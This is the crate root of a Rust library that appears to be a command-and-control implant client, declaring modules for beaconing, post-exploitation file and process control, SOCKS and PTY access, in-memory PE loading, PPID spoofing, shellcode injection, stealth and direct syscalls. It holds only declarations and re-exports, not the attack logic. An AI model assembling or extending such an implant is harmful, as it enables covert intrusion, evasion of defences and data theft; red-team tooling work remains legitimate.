#[allow(unused_imports)]
#[macro_use]
extern crate log;

#[cfg(target_os = "windows")]
#[macro_use]
extern crate winapi;

/// Debug print macro — completely eliminated in release builds.
#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        {
            log::debug!($($arg)*);
        }
    };
}

pub mod error;
pub mod types;
pub mod wire_ids;
pub mod backoff;
#[cfg(feature = "ws")]
pub mod connection;
pub mod handler;
pub mod config;
pub mod transport;
pub mod crypto;

// --- Post-ex (NOT in pure Stage0 / beacon) ---
#[cfg(feature = "post-ex")]
pub mod executor;
#[cfg(feature = "post-ex")]
pub mod fs;
#[cfg(feature = "post-ex")]
pub mod process;

#[cfg(feature = "pty")]
pub mod pty;
#[cfg(feature = "socks")]
pub mod socks;

#[macro_use]
pub mod utils;

#[cfg(all(feature = "dotnet", target_os = "windows"))]
pub mod dotnet;

#[cfg(feature = "plugin")]
pub mod plugin_router;

#[cfg(feature = "plugin")]
pub mod batch_handler;

pub mod stealth;

#[cfg(feature = "bof")]
pub mod loader;

// Syscall / native helpers (Windows). Stage0 still links a thin subset; heavy BOF
// paths remain behind feature "bof". Further strip planned in Phase 5.
pub mod syscalls;
pub mod native;

// Stage0 module package format + loader (L2 pipeline)
pub mod module_package;
#[cfg(feature = "module-loader")]
pub mod module_loader;
/// Manual-Map PE loader for L2 modules (no temp DLL).
#[cfg(all(windows, feature = "mem-map"))]
pub mod pe_map;

// PPID-spoofed sacrificial host for BOF/.NET
#[cfg(feature = "isolated-exec")]
pub mod isolated_exec;

// Re-export inject helpers for L2 mod_inject (not linked into Stage0 defaults)
#[cfg(all(windows, feature = "inject"))]
pub use native::{inject_shellcode, wait_inject_thread, InjectResult};

pub mod fallback;

// 重新导出常用类型
pub use error::{ClientError, Result};
pub use types::{
    CommandPayload, CommandResult, MessageType, MessageWrapper,
    RegisterPayload, ResponsePayload, SystemInfo,
};
pub use backoff::ExponentialBackoff;
#[cfg(feature = "ws")]
pub use connection::ConnectionManager;
#[cfg(feature = "post-ex")]
pub use executor::CommandExecutor;
pub use handler::MessageHandler;
pub use config::{
    get_server_url, validate_server_url, get_config_info, ConfigInfo,
    get_aes_key, get_crypto_config_info, CryptoConfigInfo,
    get_heartbeat_interval, get_dns_resolver,
};
#[cfg(feature = "post-ex")]
pub use fs::{ls, upload, download, FileInfo};
pub use transport::{Transport, create_transport};
pub use crypto::{encrypt, decrypt};

pub use utils::get_agent_uuid;

#[cfg(all(feature = "dotnet", target_os = "windows"))]
pub use dotnet::DotNetExecutor;

#[cfg(feature = "plugin")]
pub use plugin_router::{
    PluginRouter, PluginTask, PluginMetadata, BatchExecutionManager, BatchConfig, BufferedResult,
};

#[cfg(feature = "plugin")]
pub use batch_handler::BatchMessageHandler;

#[cfg(test)]
mod feature_gates_test;
